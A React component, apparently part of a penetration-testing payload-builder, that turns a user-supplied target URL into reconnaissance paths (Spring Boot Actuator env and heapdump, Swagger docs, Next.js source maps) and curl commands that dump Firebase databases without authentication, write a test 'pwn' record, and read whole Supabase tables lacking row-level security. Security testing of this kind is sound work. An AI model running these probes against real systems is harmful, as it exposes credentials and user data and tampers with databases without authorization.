import { useState } from 'react'
import { DISCLAIMER, Note, TextInput, Readout } from './shared'

export function ModernStackReconBuilder() {
  const [url, setUrl] = useState('')
  const trimmed = url.trim()
  const target = trimmed || 'https://TARGET'

  const reconPaths = [
    { group: 'Spring Boot Actuator', paths: ['/actuator/health', '/actuator/env', '/actuator/heapdump', '/actuator/mappings', '/actuator/beans'] },
    { group: 'Swagger / OpenAPI', paths: ['/swagger-ui.html', '/v2/api-docs', '/openapi.json', '/swagger/v1/swagger.json'] },
    { group: 'Next.js Source Maps', paths: ['/_next/static/chunks/main.js.map', '/_next/static/chunks/pages/_app.js.map'] },
  ]

  const cloudBackend = [
    { label: 'Firebase RTDB 인증 없이 전체 덤프', cmd: `curl -s "https://<PROJECT-ID>.firebaseio.com/.json"` },
    { label: 'Firebase RTDB 규칙 미설정 쓰기 테스트', cmd: `curl -s -X PUT -d '{"pwn":true}' "https://<PROJECT-ID>.firebaseio.com/pwn-test.json"` },
    { label: 'Supabase REST anon key 노출 확인', cmd: `curl -s "${target}/rest/v1/" -H "apikey: <ANON_KEY>" -H "Authorization: Bearer <ANON_KEY>"` },
    { label: 'Supabase 테이블 RLS 미설정 전체 조회', cmd: `curl -s "${target}/rest/v1/<TABLE_NAME>?select=*" -H "apikey: <ANON_KEY>"` },
  ]

  return (
    <div className="payload-builder">
      <Note>{DISCLAIMER}</Note>
      <TextInput label="대상 URL" value={url} onChange={setUrl} placeholder="https://example.com" />

      <div className="payload-readout-group">
        {reconPaths.map((g, i) => (
          <div key={i} className="recon-path-group">
            <strong className="payload-group-title">{g.group}</strong>
            {g.paths.map((p, j) => (
              <Readout key={j} value={`${target}${p}`} wrap="anywhere" />
            ))}
          </div>
        ))}
        <div className="recon-path-group">
          <strong className="payload-group-title">Supabase / Firebase 노출 경로</strong>
          {cloudBackend.map((c, i) => <Readout key={i} title={c.label} value={c.cmd} wrap="anywhere"/>)}
        </div>
      </div>
    </div>
  )
}

export default ModernStackReconBuilder
